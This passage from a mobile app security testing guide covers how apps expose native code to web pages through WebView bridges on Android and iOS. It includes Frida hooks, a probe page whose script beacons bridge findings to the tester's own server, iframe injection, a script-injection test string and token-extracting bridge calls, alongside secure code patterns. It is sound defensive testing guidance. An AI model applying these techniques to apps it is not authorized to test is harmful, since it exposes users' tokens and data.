- **iOS:** a Mac with Safari, the device connected and trusted, and either an app that sets `isInspectable = true` (iOS 16.4+) or a way to force it: GlobalWebInspect ([MASTG-TOOL-0137](https://mas.owasp.org/MASTG/tools/ios/MASTG-TOOL-0137/)) on a jailbroken device with a hooking environment such as ElleKit ([MASTG-TOOL-0139](https://mas.owasp.org/MASTG/tools/ios/MASTG-TOOL-0139/)), or Frida (jailbroken, or a re-signed IPA with Frida Gadget). OWASP's [MASTG-TECH-0139](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0139/) describes the Safari setup.
- **A probe origin you control**: an HTTPS host on a domain you own with a publicly trusted certificate (the app validates TLS, and should), serving the probe page below and keeping an access log. Use your own domain, for example `probe.example.org`, never a third party's.
- The bridge inventory from the static tests: object names, handler names, actions.

#### Steps

**1. Attach a debugger to the WebView (Android).** With the app on the bridged screen, check whether a DevTools socket exists:

```bash
adb shell cat /proc/net/unix | grep -o 'webview_devtools_remote_[0-9]*'
```

If nothing is listed, force debugging with Frida. `setWebContentsDebuggingEnabled` is static and process-wide; the hook also stops the app from switching it off again:

```javascript
// webview-debug.js
Java.perform(() => {
  const WebView = Java.use('android.webkit.WebView');
  WebView.setWebContentsDebuggingEnabled.implementation = function (enabled) {
    console.log('[app] setWebContentsDebuggingEnabled(' + enabled + ') -> forcing true');
    this.setWebContentsDebuggingEnabled(true);
  };
  Java.scheduleOnMainThread(() => WebView.setWebContentsDebuggingEnabled(true));
});
```

```bash
frida -U -f com.example.app -l webview-debug.js
```

Repackaging the APK with `android:debuggable="true"` also works (current WebView versions enable debugging automatically for debuggable apps), but it changes the signature and trips integrity checks; Frida is usually less work. Then open `chrome://inspect/#devices` in desktop Chrome and click **inspect** under the WebView. Without the UI:

```bash
adb forward tcp:9222 localabstract:webview_devtools_remote_<pid>
curl -s http://127.0.0.1:9222/json | python3 -m json.tool    # one entry per page/frame target, with URL
```

**1 (iOS).** Enable **Settings > Safari > Advanced > Web Inspector** on the device and **Show features for web developers** in Safari on the Mac, connect, then open **Develop > (device) > (app)**. If the web view is not listed, it is not inspectable. On iOS 16.4 and later, force it with Frida:

```javascript
// ios-inspectable.js
function makeInspectable(wv) {
  if (wv.respondsToSelector_(ObjC.selector('setInspectable:'))) wv.setInspectable_(true);
}
ObjC.schedule(ObjC.mainQueue, () => {
  ObjC.choose(ObjC.classes.WKWebView, { onMatch: makeInspectable, onComplete() {} });
});
Interceptor.attach(ObjC.classes.WKWebView['- initWithFrame:configuration:'].implementation, {
  onLeave(retval) {
    const wv = new ObjC.Object(retval);
    ObjC.schedule(ObjC.mainQueue, () => makeInspectable(wv));
  }
});
```

```bash
frida -U -f com.example.app -l ios-inspectable.js
```

Before iOS 16.4, only development-signed builds (with `get-task-allow`) were inspectable; GlobalWebInspect handles both cases on jailbroken devices.

**2. Log bridge registration as it happens.** This is the runtime counterpart of the static inventory and works through obfuscation and frameworks. Android:

```javascript
// bridges-android.js
Java.perform(() => {
  const WebView = Java.use('android.webkit.WebView');
  const JI = Java.use('android.webkit.JavascriptInterface').class;
  WebView.addJavascriptInterface.implementation = function (obj, name) {
    console.log('[addJavascriptInterface] window.' + name + ' = ' + obj.$className);
    const methods = obj.getClass().getMethods();
    for (let i = 0; i < methods.length; i++) {
      if (methods[i].isAnnotationPresent(JI)) console.log('    ' + methods[i].toGenericString());
    }
    return this.addJavascriptInterface(obj, name);
  };
  WebView.loadUrl.overload('java.lang.String').implementation = function (url) {
    console.log('[loadUrl] ' + url);
    return this.loadUrl(url);
  };
  try {
    const Compat = Java.use('androidx.webkit.WebViewCompat');
    Compat.addWebMessageListener.overloads.forEach(o => {
      o.implementation = function () {
        console.log('[addWebMessageListener] window.' + arguments[1] + ' rules=' + arguments[2]);
        return o.apply(this, arguments);
      };
    });
  } catch (e) {
    console.log('[!] androidx.webkit.WebViewCompat not found by name: obfuscated, use the WEB_MESSAGE_LISTENER call sites from jadx');
  }
});
```

iOS: log handler names, their classes and worlds, and every user script:

```javascript
// bridges-ios.js
const UCC = ObjC.classes.WKUserContentController;
const sels = {
  '- addScriptMessageHandler:name:': [2, -1, 3],
  '- addScriptMessageHandler:contentWorld:name:': [2, 3, 4],
  '- addScriptMessageHandlerWithReply:contentWorld:name:': [2, 3, 4]
};
Object.keys(sels).forEach(sel => {
  if (!UCC[sel]) return;
  const [h, w, n] = sels[sel];
  Interceptor.attach(UCC[sel].implementation, {
    onEnter(args) {
      const world = w < 0 ? 'page' : String(new ObjC.Object(args[w]));
      console.log('[' + sel + '] name=' + new ObjC.Object(args[n]) +
                  ' handler=' + new ObjC.Object(args[h]).$className + ' world=' + world);
    }
  });
});
Interceptor.attach(UCC['- addUserScript:'].implementation, {
  onEnter(args) {
    const s = new ObjC.Object(args[2]);
    console.log('[addUserScript] mainFrameOnly=' + s.isForMainFrameOnly() + '\n' + s.source());
  }
});
```

Then hook the handler class you found (use the exact runtime name printed as `handler=`) to see what pages send and from where:

```javascript
const H = ObjC.classes['_TtC6MyApp13BridgeHandler'];   // replace with the printed class name
Interceptor.attach(H['- userContentController:didReceiveScriptMessage:'].implementation, {
  onEnter(args) {
    const msg = new ObjC.Object(args[3]);
    const fi = msg.frameInfo();
    const o = fi.securityOrigin();
    console.log('[' + msg.name() + '] mainFrame=' + fi.isMainFrame() + ' origin=' +
                o.protocol() + '://' + o.host() + ':' + o.port() + ' body=' + msg.body());
  }
});
```

For reply handlers the selector is `- userContentController:didReceiveScriptMessage:replyHandler:`.

**3. Enumerate and call from the trusted page.** In the DevTools or Web Inspector console of the bridged page:

```javascript
// Android: candidate injected objects. Run the same line in desktop Chrome on the same URL and diff:
// names that exist only in the WebView were injected by the app.
Object.getOwnPropertyNames(window).filter(k => {
  try { const v = window[k]; return v !== null && typeof v === 'object' && !(v instanceof Node); }
  catch (e) { return false; }
}).sort().join(',');
```

```javascript
// Android, legacy bridge: list and call methods (Object.keys may list them on current WebView builds;
// otherwise use the names from jadx or the Frida log)
Object.keys(window.AppBridge);
AppBridge.getUserProfileJson();
AppBridge.getClass();        // must throw; if it returns an object you have the reflection primitive

// Android, addWebMessageListener object
typeof window.myObject;      // "object" only in frames whose origin matched the rules
myObject.onmessage = e => console.log('reply:', e.data);
myObject.postMessage(JSON.stringify({ action: 'getProfile' }));
```

```javascript
// iOS: handler names cannot be listed reliably, so test the names from the inventory
typeof window.webkit?.messageHandlers?.bridge;          // "object" = registered in the page world
await window.webkit.messageHandlers.bridge.postMessage({ action: 'getSecret' });   // reply handlers return a Promise
window.receiveSecret = s => console.log('intercepted:', s);                         // MASTG-TEST-0377 proof
window.webkit.messageHandlers.bridge.postMessage({ action: 'getSecret' });
```

Call every action with harmless arguments first, and only use state-changing actions on test accounts. Record what each returns.

**4. Prove origin restriction from a frame and after navigation.** Publish a probe on your origin. `probe.html` is a two-line page that loads the script:

```text
<!doctype html><meta charset="utf-8"><title>bridge probe</title><pre id="out"></pre>
<script src="probe.js"></script>
```

```javascript
// probe.js: put the names from your inventory in these two lists
const androidNames = ['AppBridge', 'MASBridge', 'androidBridge', '_cordovaNative', 'ReactNativeWebView'];
const iosHandlers = ['bridge', 'cordova', 'ReactNativeWebView'];
const lines = [];
function log(k, v) {
  lines.push(k + ' = ' + v);
  document.getElementById('out').textContent = lines.join('\n');
  new Image().src = '/log?' + encodeURIComponent(k + '=' + v);   // lands in your access log
}
log('origin', location.origin);
log('top frame', window === window.top);
androidNames.forEach(n => log('window.' + n, typeof window[n]));
const mh = window.webkit && window.webkit.messageHandlers;
log('webkit.messageHandlers', typeof mh);
if (mh) iosHandlers.forEach(n => log('handler ' + n, typeof mh[n]));
```

Get the probe into the WebView in two ways:

- **As a frame** inside the trusted page, which stands in for an ad, an embedded widget, or HTML injection. In the trusted page's console:

  ```javascript
  const f = document.createElement('iframe');
  f.src = 'https://probe.example.org/probe.html';
  document.body.appendChild(f);
  ```

  If the page's Content Security Policy blocks the frame, note it (it is a real control), then repeat the frame test on any page of the app that does not block it.

- **As a navigation**, which stands in for a link the user taps, a redirect, or a URL the app loads from an intent, deep link or server response. First from the console (`location.href = 'https://probe.example.org/probe.html'`), then through the app's real entry points: tap an external link in the content, send the deep link or intent that carries a URL. How to find those entry points is [MASWE-0035](/mobile/maswe-0035-webviews-loading-untrusted-content/); here you only need one that works.

For each case, read the probe's output (on screen, in the console, and in your access log). Where a bridge object or handler shows up, switch the console context to the probe frame (Chrome's context drop-down; in Safari, select the frame's execution context or inspect the frame's target) and repeat step 3's calls from there. If the allowed origin rules include `http://` origins or a `*.` wildcard, add the matching case: load the probe over plain HTTP in a lab where you control DNS, or note which subdomains under the wildcard serve content the client does not control.

**5. Clean up.** Remove the probe page when the test ends and revert any test-account changes made through state-changing actions.

#### Observation

For each WebView: the bridge objects and handlers present (with Frida registration logs), the result of calling each action from the trusted page, and for the frame and navigation cases the probe output and access-log lines showing which bridges were present and which calls succeeded, with the origin and frame flags the handler saw. Note the device, OS version and WebView (Chrome) version.

#### Evaluation

The test **fails** if a bridge that exposes sensitive data or actions is present **and** answers when called from the probe origin, in an iframe or after navigation; or, for iOS callback-style replies, if a callback you define in the page receives sensitive data. It also fails if a legacy bridge object responds to `getClass()`.

It **passes** for a bridge if the object or handler is `undefined` in the probe's frame and page (Android `addWebMessageListener` with tight rules, iOS handlers in an isolated world or behind app-bound domains), or if it is present but the handler demonstrably refuses the call (the Frida log shows the frame origin check rejecting it, and nothing is returned or changed). A bridge that is present in the probe page but has nothing sensitive behind it is a pass with an observation. A bridge that only the trusted page can reach still needs its XSS and third-party script exposure considered in the rating.

#### Demo

On the DEMO-0097 sample (lab build, debugging enabled), the Frida log and the console from the support page:

```text
[addJavascriptInterface] window.MASBridge = org.owasp.mastestapp.MastgTestWebView$SupportBridge
    public final java.lang.String org.owasp.mastestapp.MastgTestWebView$SupportBridge.getUserProfileJson()
    public final java.lang.String org.owasp.mastestapp.MastgTestWebView$SupportBridge.submitSupportMessage(java.lang.String,java.lang.String)
    public final void org.owasp.mastestapp.MastgTestWebView$SupportBridge.updateSupportPreference(java.lang.String)

> MASBridge.getUserProfileJson()
< '{"name":"John Doe","email":"john.doe@example.com","jwt":"<token>"}'
```

Injecting the probe as an iframe gives, in the access log, `window.MASBridge=object` with `origin=https://probe.example.org` and `top frame=false`: the legacy bridge answers any frame, so the token is one call away from any origin the page embeds. The same probe against a bridge moved to `addWebMessageListener(webView, "MASBridge", setOf("https://appassets.androidplatform.net"), …)` logs `window.MASBridge=undefined` from the frame, which is the pass condition for reach, while the XSS in the page itself still needs fixing.

### GT-0033-2: Native-to-page data flows on Android (Android)

Guler Tech methodology. Platform: Android. Type: static (code) and dynamic.

#### Overview

iOS has three OWASP tests on data the app pushes into or reads out of the page (0377, 0379, 0380). Android apps make the same mistakes with `evaluateJavascript`, `loadUrl("javascript:…")` and `addDocumentStartJavaScript`, and OWASP has no Android test for them. This test covers three patterns: replies to a bridge call delivered through a page-world callback, sensitive values written into the DOM, and native values concatenated into script source. One Android-specific point: a `JavaScriptReplyProxy` reply arrives on the injected object's `onmessage`, which lives in the page world of that frame, so a hostile script in the same frame can replace the handler and read the reply. Origin rules keep other origins out; they do not separate scripts inside the same frame unless the listener is bound to a separate `JavaScriptExecutionWorld`.

#### Prerequisites

The decompiled app and the bridge inventory; a device with WebView debugging (GT-0033-1, step 1) and Frida.

#### Steps

1. **Find the call sites**:

   ```bash
   grep -rnE 'evaluateJavascript\(|loadUrl\("javascript:|addDocumentStartJavaScript|JavaScriptReplyProxy|postMessage\(' out/sources/ \
       | grep -vE '^out/sources/(androidx|kotlin|kotlinx)/'
   ```

2. **Read each script** in jadx: what native value goes in (token, OTP, account data, profile), how it is inserted (string concatenation, `String.format`, or JSON encoding such as `JSONObject.quote(value)`), and what the script does with it (call a global function, assign `innerHTML`/`textContent`/`value`, store it in a global or `localStorage`). For `addDocumentStartJavaScript`, read the script and its origin rules: a script with a token in it, injected into `"*"`, gives the token to every frame.

3. **Log the scripts at runtime** to catch the ones built dynamically:

   ```javascript
   // evaljs-android.js
   Java.perform(() => {
     const WebView = Java.use('android.webkit.WebView');
     WebView.evaluateJavascript.implementation = function (script, cb) {
       console.log('[evaluateJavascript] ' + script);
       return this.evaluateJavascript(script, cb);
     };
     WebView.loadUrl.overload('java.lang.String').implementation = function (url) {
       if (url.startsWith('javascript:')) console.log('[loadUrl javascript:] ' + url);
       return this.loadUrl(url);
     };
   });
   ```

4. **Prove interception and injection** in the DevTools console: redefine the callback named in the script (`window.onToken = t => console.log('intercepted', t)`) or `myObject.onmessage`, trigger the flow in the app, and see the value arrive; read DOM elements the app writes to. If a value the attacker can influence (a display name, a message from another user) is concatenated into a script, set it to `x');console.log('injected` in a test account and watch the console.

#### Observation

The scripts the app evaluates, with the native data in each, the callback or element they target, and the console evidence of interception or injection.

#### Evaluation

The test **fails** if sensitive native data is delivered into a page-world callback, global or DOM element of a page that can run untrusted script (third-party scripts, untrusted frames, injectable content), or if attacker-influenced values are concatenated into evaluated script without encoding. It **passes** if sensitive values stay native (rendered in native views over the WebView), replies carry only what the page needs, and every value inserted into a script is JSON-encoded or passed as message data.

#### Demo

A typical failing reply, and the Frida line that shows it:

```kotlin
@JavascriptInterface
fun requestToken(callback: String) {
    val token = session.accessToken
    webView.post {
        webView.evaluateJavascript("window.$callback('$token')", null)   // page chooses the callback name too
    }
}
```

```text
[evaluateJavascript] window.onToken('<access token>')
```

Two failures in one line: the token lands in a page-world function that any script in the frame can define, and the page also chooses the name of that function, which is concatenated into script source unchecked. The fix is to not hand the token to the page at all and let native code make the authenticated request; where a reply is needed, send data, not script.

## Best practices

### MASTG-BEST-0035: Prefer Origin Scoped Messaging Over Legacy JavaScript Bridges

Source: [MASTG-BEST-0035](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0035/). Platform: Android.

A bridge is not a vulnerability; a bridge plus content you do not fully control is. `addJavascriptInterface` cannot be scoped to an origin or a frame, so it is not a security boundary for any WebView that might show untrusted content. Use `addWebMessageListener` instead: a short list of `https://` origin rules, registration before the first load, and a listener that checks `sourceOrigin` and `isMainFrame` before doing anything. If you use `postWebMessage`, give it an exact target origin, never `"*"`. Whatever the mechanism, expose a few narrow operations with simple message formats, reject unknown actions and malformed input, and do not build generic dispatchers. OWASP notes the limit of this advice, and so do we: origin scoping does not help when attacker script already runs in a trusted origin; that is fixed in the web content and by keeping secrets out of the page.

### MASTG-BEST-0058: Restrict Native Functionality Exposed Through WebView Bridges

Source: [MASTG-BEST-0058](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0058/). Platform: iOS.

Register only the handlers a page needs, give each one a narrow purpose, and remove them when the web view is done (`removeScriptMessageHandler(forName:)`). Validate the body's type and structure and reject anything unexpected. `WKWebView` has no allowlist for handlers, so check the sender yourself: `message.frameInfo.isMainFrame` and `message.frameInfo.securityOrigin` (scheme, host, and port) against the exact origins you expect, compared for equality, not by suffix. Do not use `UIWebView`, `JSContext` or `JSExport`.

```swift
func userContentController(_ ucc: WKUserContentController, didReceive message: WKScriptMessage) {
    let origin = message.frameInfo.securityOrigin
    guard message.frameInfo.isMainFrame,
          origin.protocol == "https", origin.host == "www.example.com",
          let body = message.body as? [String: String],
          body["action"] == "openHelp" else { return }
    // handle the one action this page needs
}
```

### MASTG-BEST-0062: Use WKScriptMessageHandlerWithReply to Return Data to JavaScript

Source: [MASTG-BEST-0062](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0062/). Platform: iOS 14+.

Replace `evaluateJavaScript("window.callback('…')")` replies with `WKScriptMessageHandlerWithReply`. The reply resolves the promise returned by the caller's `postMessage`, in the caller's world, and no global function is involved:

```swift
func userContentController(_ ucc: WKUserContentController,
                           didReceive message: WKScriptMessage,
                           replyHandler: @escaping (Any?, String?) -> Void) {
    guard isTrusted(message.frameInfo) else { replyHandler(nil, "rejected"); return }
    replyHandler(["displayName": profile.firstName], nil)
}

config.userContentController.addScriptMessageHandler(handler, contentWorld: .page, name: "bridge")
```

```javascript
const reply = await window.webkit.messageHandlers.bridge.postMessage({ action: "getDisplayName" });
```

This stops interception by callback replacement. It does not stop a hostile script from calling the handler itself, so the origin check stays, and secrets should still not be returned to page script.

### MASTG-BEST-0061: Use WKContentWorld Isolation for DOM Inspection Scripts

Source: [MASTG-BEST-0061](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0061/). Platform: iOS 14+.

Run scripts that read the DOM in an isolated world so page code cannot redefine the built-ins they use:

```swift
let appWorld = WKContentWorld.world(name: "AppWorld")
webView.evaluateJavaScript("document.getElementById('balance').textContent",
                           in: nil, in: appWorld) { result in
    if case .success(let value) = result { handleBalance(value) }
}
```

OWASP's sample spells the factory `WKContentWorld.world(withName:)`; the Swift API is `world(name:)` (`worldWithName:` is the Objective-C name). Isolation protects the reading code, not the data: the page still controls what is in the DOM, so validate values on the native side before acting on them.

### MASTG-BEST-0059: Render Sensitive UI as Native Views Over the WebView

Source: [MASTG-BEST-0059](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0059/). Platform: iOS.

Show secrets (OTPs, account numbers, card details, credential pickers) in a native view placed over the web view, so the value never enters the DOM. If the layout must match the page, read only the element's bounding rectangle, from an isolated-world script, and position the native view there. The same design works on Android with a native `View` over the `WebView`.

### MASTG-BEST-0060: Use Native Views for Sensitive Text Entry Over a WebView

Source: [MASTG-BEST-0060](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0060/). Platform: iOS.

For password and other secret input, intercept focus on the HTML field with an isolated-world `WKUserScript`, blur it, and present a native `UITextField` with `isSecureTextEntry = true` at the field's position. The isolated script and its handler carry only coordinates:

```swift
let appWorld = WKContentWorld.world(name: "AppWorld")
config.userContentController.add(inputHandler, contentWorld: appWorld, name: "secureInput")
config.userContentController.addUserScript(WKUserScript(source: """
    document.querySelectorAll('input[type="password"]').forEach(el => {
      el.addEventListener('focus', () => {
        const r = el.getBoundingClientRect();
        window.webkit.messageHandlers.secureInput.postMessage({ x: r.left, y: r.top, width: r.width, height: r.height });
        el.blur();
      });
    });
    """, injectionTime: .atDocumentEnd, forMainFrameOnly: true, in: appWorld))
```

Submit the typed value from native code (to your API or the Keychain), never by writing it into the field's `.value`: anything written to the DOM, from any world, is readable by page script. OWASP's sample uses `.atDocumentStart`, where the inputs do not exist yet; register at document end or observe the DOM for fields added later. The coordinates from `getBoundingClientRect()` are in the web view's viewport, so adjust for scrolling and the content inset when you place the native field.

### MASTG-BEST-0012: Disable JavaScript in WebViews

Source: [MASTG-BEST-0012](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0012/). Platform: Android.

JavaScript is off by default on Android; leave it off for WebViews that show static content (legal text, release notes, help), and no bridge can be called there. When JavaScript is needed, keep the bridge off any WebView that can show external content, and consider Custom Tabs (or a Trusted Web Activity for your own web app) for content that does not need native integration. The file and content access hardening OWASP lists with it (MASTG-BEST-0011, 0013) is covered in the [MASWE-0034 note](/mobile/maswe-0034-webviews-allow-access-to-local-resources/).

### Secure patterns (Guler Tech)

**Android: an origin- and frame-checked message bridge.** No legacy fallback: if the WebView is too old for `addWebMessageListener`, the page gets no bridge.

```kotlin
private val trustedOrigins = setOf("https://www.example.com")

fun installBridge(webView: WebView, profile: Profile) {
    webView.settings.javaScriptEnabled = true
    if (!WebViewFeature.isFeatureSupported(WebViewFeature.WEB_MESSAGE_LISTENER)) return

    WebViewCompat.addWebMessageListener(webView, "AppBridge", trustedOrigins) { _, message, sourceOrigin, isMainFrame, replyProxy ->
        if (!isMainFrame || sourceOrigin.toString() !in trustedOrigins) return@addWebMessageListener
        val request = runCatching { JSONObject(message.data ?: "") }.getOrNull()
            ?: return@addWebMessageListener
        when (request.optString("action")) {
            "getDisplayName" -> replyProxy.postMessage(JSONObject().put("name", profile.firstName).toString())
            else -> Unit   // unknown actions are ignored
        }
    }
    webView.loadUrl("https://www.example.com/app/")   // after registration
}
```

Keep the WebView's navigation restricted to the same origins (MASWE-0035), and do not return tokens: if the page needs authenticated data, let native code fetch it and return only what is displayed.

**iOS: a reply bridge with an origin check, and app glue in its own world.** If only the app's own injected script needs native access, register both the handler and the script in a named world so page script cannot see the handler at all:

```swift
final class AppBridge: NSObject, WKScriptMessageHandlerWithReply {
    func userContentController(_ ucc: WKUserContentController,
                               didReceive message: WKScriptMessage,
                               replyHandler: @escaping (Any?, String?) -> Void) {
        let origin = message.frameInfo.securityOrigin
        guard message.frameInfo.isMainFrame,
              origin.protocol == "https", origin.host == "www.example.com",
              let body = message.body as? [String: Any],
              let action = body["action"] as? String else {
            replyHandler(nil, "rejected")
            return
        }
        switch action {
        case "getDisplayName":
            replyHandler(Profile.current.firstName, nil)
        default:
            replyHandler(nil, "unsupported")
        }
    }
}

let world = WKContentWorld.world(name: "AppGlue")
config.userContentController.addScriptMessageHandler(AppBridge(), contentWorld: world, name: "app")
config.userContentController.addUserScript(WKUserScript(source: glueScript,
    injectionTime: .atDocumentEnd, forMainFrameOnly: true, in: world))
```

If page code must call native code directly, register the handler in `.page` instead and rely on the origin and frame check; consider `WKAppBoundDomains` so the handler is disabled on anything outside your domains. In both cases pass native values to scripts with `callAsyncJavaScript(_:arguments:in:in:completionHandler:)` rather than string interpolation.

## Rating findings

Rate on two axes and state both in the report: **what the bridge gives the caller** and **what an attacker must do to become a caller**. The second axis is about how attacker script gets into a frame where the bridge exists; the entry points and their tests are in [MASWE-0035](/mobile/maswe-0035-webviews-loading-untrusted-content/) (and [MASWE-0029](/mobile/maswe-0029-insecure-deep-links/), [MASWE-0032](/mobile/maswe-0032-insecure-intents/) for URLs delivered by links and intents, [MASWE-0026](/mobile/maswe-0026-cleartext-network-traffic/) and [MASWE-0027](/mobile/maswe-0027-insecure-certificate-validation/) for network injection). Typical attacker positions, from easiest to hardest:

- A **malicious app on the device** sends an intent or deep link that makes the WebView load an attacker URL: no permissions, sometimes no user interaction.
- A **malicious link or page**: the user taps a link (in a message, a web page, the app's own content) and the WebView loads it with the bridge still attached. One tap.
- **Content inside a trusted page**: a third-party script, ad or widget iframe, user-generated content with an XSS, a compromised CDN. No action beyond normal use, but needs a second weakness or a supply-chain compromise.
- A **network attacker**, only where the WebView loads HTTP content or TLS validation is broken.

Physical access and shoulder-surfing are not meaningful positions for this weakness.

| Rating | Conditions |
|---|---|
| **Critical** | A bridge that yields code execution (reflection on `targetSdkVersion` < 17 or Android < 4.2, methods that load code or write to code paths), or returns credentials, session or refresh tokens, or performs payments, account changes or other high-impact actions, **reachable from attacker-controlled content without a second vulnerability**: `addJavascriptInterface` or `"*"` rules on a WebView that loads URLs from intents or deep links, follows links to external sites, or embeds untrusted frames; iOS page-world handlers without origin checks in the same situations. Proven with GT-0033-1. |
| **High** | The same sensitive bridge reachable only through a realistic second condition: XSS in the trusted origin, third-party scripts or iframes included by the trusted page, a broad `*.` rule covering subdomains with user or third-party content, `http://` rules. Also: personal data or meaningful actions (sending messages, changing settings, reading files) reachable from attacker content without a second vulnerability. Page-world replies (0377, GT-0033-2) or DOM writes (0380) of tokens or OTPs on pages with third-party scripts. |
| **Medium** | Sensitive bridges on WebViews limited to first-party content with no third-party scripts and no known injection path, where origin and frame checks are missing or weak (`hasSuffix`, `getUrl()`): one XSS away. Page-world DOM reads used for security decisions (0379). Password fields in web views (0378) on pages that load third-party scripts. Bridges exposing low-sensitivity personal data to untrusted content. |
| **Low** | Over-exposed bridges with nothing sensitive behind them; legacy `addJavascriptInterface` on a WebView proven to show only bundled content; secrets written to the DOM or password fields on app-owned pages with no third-party scripts; missing message validation on a properly scoped bridge. |
| **Info** | Bridges correctly scoped (origin rules or isolated worlds, sender checks, validation) where the recommendation is a further reduction; a correct `WKScriptMessageHandler` that could move to `WKScriptMessageHandlerWithReply`; results obtained only after forcing debugging, where the bridge itself is sound. |

Raise a level when the bridge exposes data for other users or a shared secret (an API key valid for all users), when the attack needs no interaction (an intent from an installed app), or when the exposed function uses a dangerous runtime permission the app holds (camera, microphone, location, contacts). Lower a level when the reachable action requires a separate confirmation the attacker cannot bypass (a native biometric prompt bound to the transaction), but not for a confirmation rendered in the same WebView, which the attacker's script can click. In the report give the bridge name and class (jadx) or handler name and address (r2), the exposed methods and what each does, the WebView's content sources, the GT-0033-1 evidence from your probe origin, the device, OS and WebView versions, and the fix at the source.

## References

- OWASP MASWE: [MASWE-0033: Sensitive Native Functionality Exposed in WebViews](https://mas.owasp.org/MASWE/MASVS-PLATFORM/MASWE-0033/); related [MASWE-0034](https://mas.owasp.org/MASWE/MASVS-PLATFORM/MASWE-0034/), [MASWE-0035](https://mas.owasp.org/MASWE/MASVS-PLATFORM/MASWE-0035/) (CC BY-SA 4.0)
- OWASP MASVS: [MASVS-PLATFORM-2](https://mas.owasp.org/MASVS/controls/MASVS-PLATFORM-2/), [MASVS-STORAGE-2](https://mas.owasp.org/MASVS/controls/MASVS-STORAGE-2/) (CC BY-SA 4.0)
- OWASP MASTG knowledge: [MASTG-KNOW-0018: WebViews (Android)](https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0018/), [MASTG-KNOW-0076: WebViews (iOS)](https://mas.owasp.org/MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0076/), [MASTG-KNOW-0139: WKContentWorld](https://mas.owasp.org/MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0139/) (CC BY-SA 4.0)
- OWASP MASTG tests: [MASTG-TEST-0334](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0334/), [MASTG-TEST-0376](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0376/), [MASTG-TEST-0377](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0377/), [MASTG-TEST-0378](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0378/), [MASTG-TEST-0379](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0379/), [MASTG-TEST-0380](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0380/), [MASTG-TEST-0227](https://mas.owasp.org/MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0227/); legacy [MASTG-TEST-0033](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0033/), [MASTG-TEST-0078](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0078/) (CC BY-SA 4.0)
- OWASP MASTG demos: [MASTG-DEMO-0097](https://mas.owasp.org/MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0097/MASTG-DEMO-0097/), [MASTG-DEMO-0142](https://mas.owasp.org/MASTG/demos/ios/MASVS-PLATFORM/MASTG-DEMO-0142/MASTG-DEMO-0142/), [MASTG-DEMO-0143](https://mas.owasp.org/MASTG/demos/ios/MASVS-PLATFORM/MASTG-DEMO-0143/MASTG-DEMO-0143/), [MASTG-DEMO-0144](https://mas.owasp.org/MASTG/demos/ios/MASVS-PLATFORM/MASTG-DEMO-0144/MASTG-DEMO-0144/), [MASTG-DEMO-0145](https://mas.owasp.org/MASTG/demos/ios/MASVS-PLATFORM/MASTG-DEMO-0145/MASTG-DEMO-0145/), [MASTG-DEMO-0146](https://mas.owasp.org/MASTG/demos/ios/MASVS-PLATFORM/MASTG-DEMO-0146/MASTG-DEMO-0146/) (CC BY-SA 4.0)
- OWASP MASTG best practices: [MASTG-BEST-0012](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0012/), [MASTG-BEST-0035](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0035/), [MASTG-BEST-0058](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0058/), [MASTG-BEST-0059](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0059/), [MASTG-BEST-0060](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0060/), [MASTG-BEST-0061](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0061/), [MASTG-BEST-0062](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0062/) (CC BY-SA 4.0)
- OWASP MASTG techniques: [MASTG-TECH-0013](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0013/), [MASTG-TECH-0014](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0014/), [MASTG-TECH-0017](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0017/), [MASTG-TECH-0023](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0023/), [MASTG-TECH-0058](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/), [MASTG-TECH-0066](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0066/), [MASTG-TECH-0071](https://mas.owasp.org/MASTG/techniques/generic/MASTG-TECH-0071/), [MASTG-TECH-0076](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0076/), [MASTG-TECH-0139](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0139/) (CC BY-SA 4.0)
